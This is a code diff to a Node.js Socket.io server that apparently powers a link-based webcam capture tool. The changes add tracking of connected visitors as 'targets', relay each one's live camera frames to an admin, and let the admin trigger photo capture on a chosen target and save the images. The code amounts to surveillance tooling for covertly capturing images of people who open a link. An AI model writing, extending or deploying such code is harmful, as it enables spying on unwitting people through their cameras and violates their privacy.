@@ -15,9 +15,9 @@ if (!fs.existsSync(uploadDir)) {
 
 let storedPhotos = [];
 let isAutoCaptureOn = true;
-let isLinkActive = true; // Link access state control
+let isLinkActive = true;
+let connectedTargets = {}; // Track active user sockets
 
-// Middleware / Route check for Link ON/OFF status
 app.use((req, res, next) => {
     if (!isLinkActive && req.path !== '/admin.html') {
         return res.send(`
@@ -50,17 +50,23 @@ app.use(express.static(__dirname));
 app.use('/uploads', express.static(uploadDir));
 
 io.on('connection', (socket) => {
+    // Add user to active target pool if not admin
+    connectedTargets[socket.id] = { id: socket.id };
+    io.emit('update-users-list', connectedTargets);
+
+    socket.on('disconnect', () => {
+        delete connectedTargets[socket.id];
+        io.emit('update-users-list', connectedTargets);
+    });
 
     socket.on('admin-auth-success', () => {
         socket.emit('load-stored-photos', storedPhotos);
+        socket.emit('update-users-list', connectedTargets);
     });
 
-    // Admin toggle link state handler
     socket.on('admin-toggle-link', (status) => {
         isLinkActive = status;
-        console.log(`🔗 Link status changed by Admin: ${isLinkActive}`);
         if (!isLinkActive) {
-            // Disconnect/stop active users instantly
             io.emit('disable-user-access');
         }
     });
@@ -71,14 +77,19 @@ io.on('connection', (socket) => {
         }
     });
 
+    // Relay live stream frame with socket id tag
     socket.on('live-stream-frame', (frameData) => {
         if (isLinkActive) {
-            io.emit('update-live-stream', frameData);
+            io.emit('update-live-stream', { socketId: socket.id, frameData });
         }
     });
 
-    socket.on('admin-trigger-capture', () => {
-        if (isLinkActive) {
+    // Handle manual capture (target specific or global fallback)
+    socket.on('admin-trigger-capture', (targetSocketId) => {
+        if (!isLinkActive) return;
+        if (targetSocketId && connectedTargets[targetSocketId]) {
+            io.to(targetSocketId).emit('capture-photo');
+        } else {
             io.emit('capture-photo');
         }
     });
@@ -86,7 +97,7 @@ io.on('connection', (socket) => {
     socket.on('user-photo-captured', (imageData) => {
         if (!isLinkActive) return;
         const base64Data = imageData.replace(/^data:image\/jpeg;base64,/, "");
-        const fileName = `photo_${Date.now()}.jpg`;
+        const fileName = `photo_${Date.now()}_${socket.id.substr(0,4)}.jpg`;
         const filePath = path.join(uploadDir, fileName);
 
         fs.writeFile(filePath, base64Data, 'base64', (err) => {
